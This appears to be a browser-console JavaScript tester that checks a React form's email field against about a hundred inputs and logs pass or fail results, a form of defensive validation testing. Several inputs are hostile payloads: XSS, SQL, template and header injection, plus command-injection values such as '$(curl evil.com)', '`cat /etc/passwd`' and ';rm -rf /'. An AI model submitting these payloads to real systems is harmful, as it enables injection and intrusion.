/**
 * Email Field Validation Tester  v5.8
 * ─────────────────────────────────────
 * ROOT CAUSE (final, for real):
 *   React REMOVES the __error-message span from the DOM when the error clears,
 *   then creates a NEW one when the next error fires. The cached errorEl
 *   reference pointed at the old detached node → getBoundingClientRect()
 *   always returned 0 → isErrorVisible() always returned false.
 *
 * FIX: query .input-main-container__error-message fresh on every check.
 *   No caching. If the element exists and is visible → error is showing.
 *   If it doesn't exist → no error.
 */

(async () => {

const COMMIT_MS  = 150;
const VALID_MS   = 350;
const RESET_ADDR = 'reset@gmail.com';

const LONG_LOCAL  = 'a'.repeat(65) + '@gmail.com';
const LOCAL_64    = 'a'.repeat(64) + '@gmail.com';
const LONG_DOMAIN = 'a'.repeat(64) + '.com';
const STR_1000    = 'a'.repeat(988)  + '@gmail.com';
const STR_10000   = 'a'.repeat(9988) + '@gmail.com';

const TESTS = [
  ['1.1',  '<script>alert(1)</script>@gmail.com',                 'REJECT'],
  ['1.2',  '"<script>alert(1)</script>"@gmail.com',               'REJECT'],
  ['1.3',  'test@<script>alert(1)</script>.com',                  'REJECT'],
  ['1.4',  'test+<script>alert(1)</script>@gmail.com',            'REJECT'],
  ['1.5',  'test@gmail.com<script>alert(1)</script>',             'REJECT'],
  ['1.6',  'test@gmail.com" onmouseover="alert(1)',               'REJECT'],
  ['1.7',  '<img src=x onerror=alert(1)>@gmail.com',             'REJECT'],
  ['1.8',  'javascript:alert(1)@gmail.com',                       'REJECT'],
  ['1.9',  'data:text/html,<script>alert(1)</script>@gmail.com',  'REJECT'],
  ['1.10', '%3Cscript%3Ealert(1)%3C/script%3E@gmail.com',        'REJECT'],
  ['1.11', '&lt;script&gt;alert(1)&lt;/script&gt;@gmail.com',    'REJECT'],
  ["2.1",  "test'); DROP TABLE users;--@gmail.com",               'REJECT'],
  ["2.2",  "' OR '1'='1@gmail.com",                               'REJECT'],
  ["2.3",  "admin'--@gmail.com",                                  'REJECT'],
  ["2.4",  "test@gmail.com'; SELECT * FROM bookings;--",          'REJECT'],
  ['2.5',  '{"$ne":null}@gmail.com',                              'REJECT'],
  ['2.6',  'test@gmail.com|whoami',                               'REJECT'],
  ['2.7',  'test@gmail.com;rm -rf /',                             'REJECT'],
  ['2.8',  'test@gmail.com$(curl evil.com)',                      'REJECT'],
  ['2.9',  'test@gmail.com`cat /etc/passwd`',                     'REJECT'],
  ['3.1',  'test@gmail.com%0ABcc:attacker@evil.com',              'REJECT'],
  ['3.2',  'test@gmail.com%0D%0ABcc:attacker@evil.com',           'REJECT'],
  ['3.3',  'test@gmail.com\r\nBcc:attacker@evil.com',             'REJECT'],
  ['3.4',  'test@gmail.com\nBcc:attacker@evil.com',               'REJECT'],
  ['3.5',  'test@gmail.com%0ASubject:Hacked',                     'REJECT'],
  ['3.6',  'test@gmail.com%0AContent-Type:text/html',             'REJECT'],
  ['3.7',  '"test\r\nBcc:attacker@evil.com"@gmail.com',           'REJECT'],
  ['4.1',  '',                                                     'REJECT'],
  ['4.2',  ' ',                                                    'REJECT'],
  ['4.3',  'plainaddress',                                         'REJECT'],
  ['4.4',  '@gmail.com',                                           'REJECT'],
  ['4.5',  'test@',                                                'REJECT'],
  ['4.6',  'test@@gmail.com',                                      'REJECT'],
  ['4.7',  'test@gmail@com',                                       'REJECT'],
  ['4.8',  'test@gmail',                                           'REJECT'],
  ['4.9',  'test@.com',                                            'REJECT'],
  ['4.10', 'test@gmail..com',                                      'REJECT'],
  ['4.11', '.test@gmail.com',                                      'REJECT'],
  ['4.12', 'test.@gmail.com',                                      'REJECT'],
  ['4.13', 'te..st@gmail.com',                                     'REJECT'],
  ['4.14', 'test@gmail.c',                                         'WARN'  ],
  ['4.15', 'test@-gmail.com',                                      'REJECT'],
  ['4.16', 'test@gmail-.com',                                      'REJECT'],
  ['4.17', 'test gmail.com',                                       'REJECT'],
  ['4.18', 'test@ gmail.com',                                      'REJECT'],
  ['4.19', 'test @gmail.com',                                      'REJECT'],
  ['4.20', 'test@gmail .com',                                      'REJECT'],
  ['5.1',  'a@b.co',                                               'ACCEPT'],
  ['5.2',  LONG_LOCAL,                                             'REJECT'],
  ['5.3',  LOCAL_64,                                               'ACCEPT'],
  ['5.4',  LONG_DOMAIN,                                            'REJECT'],
  ['5.5',  'a'.repeat(243) + '@gmail.com',                         'WARN'  ],
  ['5.6',  STR_1000,                                               'REJECT'],
  ['5.7',  STR_10000,                                              'REJECT'],
  ['6.1',  'tëst@gmail.com',                                       'WARN'  ],
  ['6.2',  'test@gmäil.com',                                       'WARN'  ],
  ['6.3',  '用户@例え.jp',                                          'WARN'  ],
  ['6.4',  'test@gma\u0456l.com',                                  'REJECT'],
  ['6.5',  'test@gmail.com\u200B',                                  'REJECT'],
  ['6.6',  'te\u202Est@gmail.com',                                  'REJECT'],
  ['6.7',  '🙂@gmail.com',                                         'REJECT'],
  ['6.8',  'test@🙂.com',                                          'REJECT'],
  ['6.9',  'test@gmail.com\uFEFF',                                  'REJECT'],
  ['7.1',  ' test@gmail.com',                                      'WARN'  ],
  ['7.2',  'test@gmail.com ',                                      'WARN'  ],
  ['7.3',  'test@gmail.com\t',                                     'REJECT'],
  ['7.4',  'test\t@gmail.com',                                     'REJECT'],
  ['7.5',  'test@gmail.com\0',                                     'REJECT'],
  ['7.6',  'test@gmail.com\x07',                                   'REJECT'],
  ['8.1',  'test(comment)@gmail.com',                             'REJECT'],
  ['8.2',  '"test"@gmail.com',                                     'WARN'  ],
  ['8.3',  '"test test"@gmail.com',                                'WARN'  ],
  ['8.4',  'test@[192.168.1.1]',                                   'REJECT'],
  ['8.5',  'test@[IPv6:2001:db8::1]',                             'REJECT'],
  ['8.6',  'test@localhost',                                       'REJECT'],
  ['8.7',  'test@127.0.0.1',                                      'REJECT'],
  ['9.1',  'test@gmail.com,attacker@evil.com',                    'REJECT'],
  ['9.2',  'test@gmail.com;attacker@evil.com',                    'REJECT'],
  ['9.3',  'test@gmail.com attacker@evil.com',                    'REJECT'],
  ['9.4',  'Test User <test@gmail.com>',                          'REJECT'],
  ['10.1', "{{constructor.constructor('alert(1)')()}}@gmail.com", 'REJECT'],
  ['10.2', '${alert(1)}@gmail.com',                               'REJECT'],
  ['10.3', '<%= 7*7 %>@gmail.com',                                'REJECT'],
  ['10.4', '{{7*7}}@gmail.com',                                   'REJECT'],
  ['10.5', '\u201Ctest\u201D@gmail.com',                          'REJECT'],
  ['11.1',  'test+booking@gmail.com',                             'ACCEPT'],
  ['11.2',  'test+abc+def@gmail.com',                             'ACCEPT'],
  ['11.3',  'first.last@gmail.com',                               'ACCEPT'],
  ['11.4',  'first.middle.last@gmail.com',                        'ACCEPT'],
  ['11.5',  'test_user@gmail.com',                                'ACCEPT'],
  ['11.6',  'test-user@gmail.com',                                'ACCEPT'],
  ['11.7',  '1234567890@gmail.com',                               'ACCEPT'],
  ['11.8',  'test@sub.domain.gmail.com',                          'ACCEPT'],
  ['11.9',  'test@mail-server.co.uk',                             'ACCEPT'],
  ['11.10', 'test@example.museum',                                'ACCEPT'],
  ['11.11', 'test@example.travel',                                'ACCEPT'],
  ['11.12', 'test@example.xn--p1ai',                              'ACCEPT'],
  ['11.13', 'TEST@GMAIL.COM',                                     'ACCEPT'],
  ['11.14', 'Test@Gmail.Com',                                     'ACCEPT'],
  ['11.15', 'a@b.co',                                             'ACCEPT'],
];

/* ── HELPERS ──────────────────────────────────────────────────────────*/

const nativeSetter = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value').set;
const sleep = ms => new Promise(r => setTimeout(r, ms));

function getOnChange(el) {
  const key = Object.keys(el).find(k => k.startsWith('__reactProps'));
  return key ? el[key].onChange : null;
}

/* ── FIND EMAIL INPUT ─────────────────────────────────────────────────*/

const emailInput =
  document.querySelector('input#email') ||
  document.querySelector('input[name="email"]') ||
  [...document.querySelectorAll('input')].find(el =>
    (el.id || '').toLowerCase().includes('email') ||
    (el.placeholder || '').toLowerCase().includes('email')
  );

if (!emailInput) { console.error('❌ Email input not found.'); return; }

const labelWrapper = emailInput.closest('label') || emailInput.closest('.input-main-container');
if (!labelWrapper) { console.error('❌ Label wrapper not found.'); return; }

/**
 * Always queries fresh — React removes/recreates the error element,
 * so a cached reference goes stale after the first clear.
 * Returns true when the error element exists in the DOM AND is visible.
 */
function isErrorVisible() {
  const el = labelWrapper.querySelector('.input-main-container__error-message');
  if (!el || !el.isConnected) return false;
  const cs = getComputedStyle(el);
  if (cs.display === 'none' || cs.visibility === 'hidden') return false;
  if (parseFloat(cs.opacity) < 0.1) return false;
  const rect = el.getBoundingClientRect();
  return rect.height > 1;
}

async function setValue(input, value) {
  const onChange = getOnChange(input);
  nativeSetter.call(input, value);
  if (onChange) {
    onChange({ target: input, currentTarget: input });
  } else {
    input.dispatchEvent(new Event('input',  { bubbles: true }));
    input.dispatchEvent(new Event('change', { bubbles: true }));
  }
  await sleep(COMMIT_MS);
  input.dispatchEvent(new FocusEvent('blur', { bubbles: true }));
  await sleep(VALID_MS);
}

/* ── CALIBRATION ──────────────────────────────────────────────────────*/

console.log('Found input:', emailInput);
console.log('onChange:', typeof getOnChange(emailInput));

console.log('🔍 Step 1: trigger error…');
await setValue(emailInput, 'CALIBRATE_BAD');

if (!isErrorVisible()) {
  console.error('❌ isErrorVisible() returned false after bad input.');
  const el = labelWrapper.querySelector('.input-main-container__error-message');
  console.error('   Element found:', el);
  if (el) {
    const cs = getComputedStyle(el);
    console.error('   display:', cs.display, '| visibility:', cs.visibility,
                  '| opacity:', cs.opacity, '| height:', el.getBoundingClientRect().height,
                  '| connected:', el.isConnected, '| text:', el.textContent.trim());
  }
  return;
}
console.log('%c✅ Error visible after bad input.', 'color:#1a7f3c;font-weight:bold');

console.log('🔍 Step 2: confirm clears after valid email…');
await setValue(emailInput, RESET_ADDR);

if (isErrorVisible()) {
  console.error('❌ Error still visible after valid email.');
  return;
}
console.log('%c✅ Calibration complete.\n', 'color:#1a7f3c;font-weight:bold');

/* ── RESET ────────────────────────────────────────────────────────────*/

async function resetField() {
  await setValue(emailInput, RESET_ADDR);
  if (isErrorVisible()) {
    await sleep(300);
    await setValue(emailInput, RESET_ADDR);
  }
}

/* ── XSS TRAP ─────────────────────────────────────────────────────────*/

let xssAlertFired = false;
const _origAlert = window.alert;
window.alert = (...a) => { xssAlertFired = true; console.error('🚨 XSS alert()!', ...a); };

/* ── MAIN LOOP ────────────────────────────────────────────────────────*/

console.group('%c📧 Email Validation Tester  v5.8', 'font-size:14px;font-weight:bold');
console.log(`Running ${TESTS.length} tests…\n`);

const results = { PASS:[], FAIL:[], INFO:[], XSS:[] };

for (const [id, value, expectation] of TESTS) {
  xssAlertFired = false;
  await resetField();
  await setValue(emailInput, value);

  const errorShown = isErrorVisible();
  let outcome;
  if (xssAlertFired)               outcome = 'XSS';
  else if (expectation === 'ACCEPT') outcome = errorShown ? 'FAIL' : 'PASS';
  else if (expectation === 'REJECT') outcome = errorShown ? 'PASS' : 'FAIL';
  else                               outcome = 'INFO';

  const label  = value.length > 55 ? value.slice(0,52)+'…' : value;
  const actual = errorShown ? 'REJECTED' : 'ACCEPTED';
  const icon   = {PASS:'✅',FAIL:'❌',INFO:'⚠️',XSS:'🚨'}[outcome];
  const style  = {
    PASS:'color:#1a7f3c;font-weight:bold', FAIL:'color:#c0392b;font-weight:bold',
    INFO:'color:#b7791f;font-weight:bold', XSS :'color:#900;background:#ffe;font-weight:bold',
  }[outcome];

  console.log(
    `%c[${outcome}]%c  #${id.padEnd(5)}  ${icon}  ${actual.padEnd(8)}  exp:${expectation.padEnd(6)}  "${label}"`,
    style, 'color:inherit'
  );
  results[outcome].push({ id, value, expectation, actual });
}

window.alert = _origAlert;
await setValue(emailInput, '');

/* ── SUMMARY ──────────────────────────────────────────────────────────*/

const total = TESTS.length;
const pct   = n => Math.round(n/total*100);
console.log('\n%c══════════════ SUMMARY ══════════════','font-weight:bold');
console.log(`%c✅ PASS  ${results.PASS.length}  (${pct(results.PASS.length)}%)`,'color:#1a7f3c;font-weight:bold');
console.log(`%c❌ FAIL  ${results.FAIL.length}  (${pct(results.FAIL.length)}%)`,'color:#c0392b;font-weight:bold');
console.log(`%c⚠️  INFO  ${results.INFO.length}  (document these)`,'color:#b7791f;font-weight:bold');
console.log(`%c🚨 XSS   ${results.XSS.length}`,'color:#900;font-weight:bold');

if (results.FAIL.length) {
  console.group('%c❌ FAILURES','color:#c0392b;font-weight:bold');
  for (const r of results.FAIL) {
    const note = r.expectation==='REJECT' ? '← should be BLOCKED' : '← should be ACCEPTED';
    console.log(`  #${r.id.padEnd(5)}  ${r.actual.padEnd(8)}  ${note}  →  "${r.value}"`);
  }
  console.groupEnd();
}
if (results.XSS.length) {
  console.group('%c🚨 XSS ALERTS','color:#900;font-weight:bold');
  for (const r of results.XSS) console.log(`  #${r.id}  "${r.value}"`);
  console.groupEnd();
}
if (results.INFO.length) {
  console.group('%c⚠️  INFO','color:#b7791f;font-weight:bold');
  for (const r of results.INFO) console.log(`  #${r.id.padEnd(5)}  ${r.actual.padEnd(8)}  "${r.value}"`);
  console.groupEnd();
}
console.groupEnd();
window.__emailTestResults = results;
console.log('\n💾 window.__emailTestResults   →   copy(window.__emailTestResults)');

})();
